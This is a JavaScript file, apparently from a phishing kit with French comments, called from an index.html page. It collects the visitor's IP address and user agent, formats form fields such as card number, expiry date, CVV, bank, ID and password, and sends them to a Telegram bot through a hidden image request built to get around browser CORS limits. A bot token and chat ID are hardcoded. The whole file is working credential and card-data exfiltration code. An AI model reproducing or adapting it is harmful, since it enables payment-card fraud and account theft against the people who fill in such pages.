// tg.js
// JSONP ipify + <img> pour Telegram, compatible Safari iOS et tous devices

const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

// 1) JSONP ipify : charge l'IP publique dans window.__CLIENT_IP__
function handleIP(data) {
  window.__CLIENT_IP__ = data.ip;
}
(function() {
  var s = document.createElement('script');
  s.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
  document.head.appendChild(s);
})();

// conserve les <img> pour éviter le GC prématuré sur Safari iOS
window._tgImages = [];

function sendTelegramNotification(message) {
  var ip = window.__CLIENT_IP__ || 'unknown';
  var ua = navigator.userAgent || 'unknown';

  // Timestamp
  var now = new Date();
  var pad = function(n) { return String(n).padStart(2,'0'); };
  var datetime = pad(now.getDate()) + '/' + pad(now.getMonth()+1) + '/' +
                 now.getFullYear().toString().slice(-2) + ', ' +
                 pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());

  // Build markdown text
  var parts = message.split('\n');
  var header = parts.shift();
  var text = '[📝] ' + header;
  if (parts.length) {
    text += '\n' + parts.map(function(line) {
      if (line.indexOf('Nom:') === 0)       return line.replace('Nom:','👤 Nom:');
      if (line.indexOf('Prénom:') === 0)    return line.replace('Prénom:','🙋 Prénom:');
      if (line.indexOf('Téléphone:') === 0) return line.replace('Téléphone:','📞 Téléphone:');
      if (line.indexOf('Email:') === 0)     return line.replace('Email:','✉️ Email:');
      if (line.indexOf('Adresse:') === 0)   return line.replace('Adresse:','🏠 Adresse:');
      if (line.indexOf('Numéro:') === 0)    return line.replace('Numéro:','💳 Numéro:');
      if (line.indexOf('Exp:') === 0)       return line.replace('Exp:','📅 Exp:');
      if (line.indexOf('CVV:') === 0)       return line.replace('CVV:','🔒 CVV:');
      if (line.indexOf('Banque:') === 0)    return line.replace('Banque:','🏦 Banque:');
      if (line.indexOf('ID:') === 0)        return line.replace('ID:','🆔 ID:');
      if (line.indexOf('Pass:') === 0)      return line.replace('Pass:','🔑 Pass:');
      return line;
    }).join('\n');
  }
  text += '\n\n[🗓️] Date & heure : ' + datetime +
          '\n[🌐] IP Client     : ' + ip +
          '\n[📍] User-Agent    : ' + ua;

  // 2) Envoi via <img> GET pour bypass CORS dans Safari iOS
  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN +
            '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) +
            '&parse_mode=Markdown&text=' + encodeURIComponent(text);
  var img = new Image();
  img.src = url;
  window._tgImages.push(img);
}

// expose pour appel depuis index.html
window.sendTelegramNotification = sendTelegramNotification;